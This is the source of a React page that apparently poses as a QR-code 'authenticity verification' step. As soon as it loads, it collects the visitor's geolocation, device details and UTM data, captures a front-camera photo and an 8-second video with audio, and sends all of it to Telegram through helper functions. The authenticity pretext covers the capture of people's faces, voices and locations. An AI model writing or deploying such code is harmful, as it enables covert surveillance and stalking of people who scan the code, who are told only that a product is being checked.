"use client";

import { useEffect, useState, useRef, useCallback } from 'react';
import { useSearchParams, usePathname } from 'next/navigation';
import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi';
import { useLayoutContext } from '@/context/LayoutContext';
import { showSuccess, showError } from '@/utils/toast';
import LoadingSpinner from '@/components/LoadingSpinner';
import { RefreshCcw } from 'lucide-react';
import { UAParser } from 'ua-parser-js';

type QrVerifyPageProps = {
  params: { lang: string };
};

const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
  const searchParams = useSearchParams();
  const pathname = usePathname();
  const { t } = useLayoutContext();
  const currentLang = params.lang;

  const [statusMessage, setStatusMessage] = useState<string>(t.authenticity.processingRequest);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [isCameraActive, setIsCameraActive] = useState<boolean>(false);
  const [isRecording, setIsRecording] = useState<boolean>(false);
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
  const [videoPreviewUrl, setVideoPreviewUrl] = useState<string | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  const stopCamera = useCallback(() => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      setStream(null);
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    setIsCameraActive(false);
  }, [stream]);

  const startVerificationProcess = useCallback(async () => {
    setIsLoading(true);
    setError(null);
    setRecordedChunks([]);
    setVideoPreviewUrl(null);
    setStatusMessage(t.authenticity.processingRequest);

    let geoLat: number | null = null;
    let geoLon: number | null = null;

    try {
      // 1. Get Geolocation
      setStatusMessage(t.authenticity.processingRequest + " (Getting location...)");
      if (navigator.geolocation) {
        try {
          const position = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: false });
          });
          geoLat = position.coords.latitude;
          geoLon = position.coords.longitude;
          setStatusMessage(t.authenticity.processingRequest + " (Location obtained.)");
        } catch (geoError) {
          console.warn("Geolocation permission denied or error:", geoError);
          setStatusMessage(t.authenticity.processingRequest + " (Location access denied or failed.)");
        }
      } else {
        setStatusMessage(t.authenticity.processingRequest + " (Geolocation not supported.)");
      }

      // 2. Get User-Agent details and client timezone
      const uaParser = new UAParser();
      const uaResult = uaParser.getResult();
      const deviceVendor = uaResult.device.vendor || null;
      const deviceModel = uaResult.device.model || null;
      const cpuArchitecture = uaResult.cpu.architecture || null;
      const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      // 3. Send initial visit notification to get caption
      setStatusMessage(t.authenticity.processingRequest + " (Sending initial notification...)");
      const utmQueryParams = {
        utm_source: searchParams?.get('utm_source') || null,
        utm_medium: searchParams?.get('utm_medium') || null,
        utm_campaign: searchParams?.get('utm_campaign') || null,
      };
      const bodyData = {
        lat: geoLat,
        lon: geoLon,
        screenWidth: window.innerWidth,
        screenHeight: window.innerHeight,
        isQrScan: true,
        pagePath: pathname,
        deviceVendor,
        deviceModel,
        cpuArchitecture,
        clientTimezone,
      };
      const initialCaption = await notifyVisit(bodyData, utmQueryParams);
      setStatusMessage(t.authenticity.processingRequest + " (Initial notification sent.)");

      // 4. Request Camera Access (front camera first)
      setStatusMessage(t.authenticity.processingRequest + " (Requesting camera access...)");
      let mediaStream: MediaStream;
      try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
        setStatusMessage(t.authenticity.processingRequest + " (Camera access granted.)");
      } catch (frontCameraError: unknown) {
        console.warn("Front camera not available or permission denied, trying rear camera:", frontCameraError);
        try {
          mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
          setStatusMessage(t.authenticity.processingRequest + " (Rear camera access granted.)");
        } catch (rearCameraError: unknown) {
          console.error("No camera available or permission denied for both front and rear cameras:", rearCameraError);
          throw new DOMException("No camera available or permission denied.", "NotFoundError");
        }
      }
      
      setStream(mediaStream);
      setIsCameraActive(true);

      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        await videoRef.current.play();
      }

      await new Promise(resolve => setTimeout(resolve, 1000)); 

      // 5. Take Photo
      setStatusMessage(t.authenticity.processingRequest + " (Taking photo...)");
      if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        if (ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
          
          try {
            await sendTelegramPhoto({ photoBase64, caption: initialCaption });
            setStatusMessage(t.authenticity.processingRequest + " (Photo sent.)");
          } catch (photoSendError: unknown) {
            console.error("Error sending photo to Telegram:", photoSendError);
            setError(t.authenticity.qrScanError + (photoSendError instanceof Error ? `: ${photoSendError.message}` : "."));
            setIsLoading(false);
            stopCamera();
            return;
          }
        }
      }

      // 6. Start Video Recording (if photo was successful)
      setStatusMessage(t.authenticity.recordingInstructions + " (Starting video recording...)");
      const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
      setMediaRecorder(recorder);

      recorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          setRecordedChunks((prev) => [...prev, event.data]);
        }
      };

      recorder.onstop = async () => {
        setIsRecording(false);
        stopCamera();
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        setVideoPreviewUrl(url);
        
        try {
          setStatusMessage(t.authenticity.processingRequest + " (Sending video...)");
          const filename = `qr_scan_video_${new Date().getTime()}.webm`;
          await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
          showSuccess(t.authenticity.recordingSuccess);
          setStatusMessage(t.authenticity.recordingSuccess);
        } catch (videoSendError: unknown) {
          console.error("Error sending video to Telegram:", videoSendError);
          showError(t.authenticity.recordingError);
          setError(t.authenticity.recordingError + (videoSendError instanceof Error ? `: ${videoSendError.message}` : "."));
          setStatusMessage(t.authenticity.recordingError);
        } finally {
          setIsLoading(false);
        }
      };

      recorder.start();
      setIsRecording(true);
      setTimeout(() => {
        if (recorder.state !== 'inactive') {
          recorder.stop();
        }
      }, 8000);

    } catch (err: unknown) {
      console.error("Error during QR verification process:", err);
      if (err instanceof DOMException && err.name === "NotAllowedError") {
        setError(t.authenticity.qrScanError + " (Camera access denied).");
        setStatusMessage(t.authenticity.qrScanError + " (Camera access denied).");
        showError(t.authenticity.qrScanError + " (Camera access denied).");
      } else if (err instanceof DOMException && err.name === "NotFoundError") {
        setError(t.authenticity.qrScanError + " (No camera found).");
        setStatusMessage(t.authenticity.qrScanError + " (No camera found).");
        showError(t.authenticity.qrScanError + " (No camera found).");
      } else {
        setError(t.authenticity.qrScanError + (err instanceof Error ? `: ${err.message}` : "."));
        setStatusMessage(t.authenticity.qrScanError);
        showError(t.authenticity.qrScanError);
      }
      setIsLoading(false);
      setIsRecording(false);
      stopCamera();
    }
  }, [searchParams, pathname, t, stopCamera, recordedChunks]);

  useEffect(() => {
    startVerificationProcess();

    return () => {
      stopCamera();
      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
      }
      if (videoPreviewUrl) {
        URL.revokeObjectURL(videoPreviewUrl);
      }
    };
  }, [startVerificationProcess, mediaRecorder, videoPreviewUrl, stopCamera]);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen p-4 text-center bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-50">
      <h1 className="text-3xl font-bold mb-6">{t.authenticity.title}</h1>
      
      {isLoading && (
        <div className="mb-4">
          <LoadingSpinner />
        </div>
      )}

      <p className="text-lg mb-4">{statusMessage}</p>
      
      {error && (
        <p className="text-red-600 dark:text-red-400 text-base mb-4">{error}</p>
      )}

      <div className="relative w-full max-w-md aspect-video bg-gray-200 dark:bg-gray-700 rounded-lg overflow-hidden shadow-lg mb-6">
        {isCameraActive && !videoPreviewUrl && (
          <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover"></video>
        )}
        {/* Changed to explicit closing tag */}
        {videoPreviewUrl && (
          <video
            src={videoPreviewUrl}
            className="w-full h-full object-cover"
            controls
            autoPlay
            loop
          ></video>
        )}
        {/* Changed to explicit closing tag */}
        {isRecording && (
          <div className="absolute top-2 left-2 bg-red-600 text-white text-xs px-2 py-1 rounded-full flex items-center">
            <span className="relative flex h-2 w-2 mr-1">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-white"></span>
            </span>
            REC
          </div>
        )}
        <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>
      </div>

      {error && (
        <button
          onClick={() => window.location.reload()}
          className="mt-4 px-6 py-3 bg-primary-600 text-white rounded-full shadow-lg hover:bg-primary-700 transition-colors"
        >
          <RefreshCcw className="inline-block mr-2" /> Try Again
        </button>
      )}
    </div>
  );
};

export default QrVerifyPage;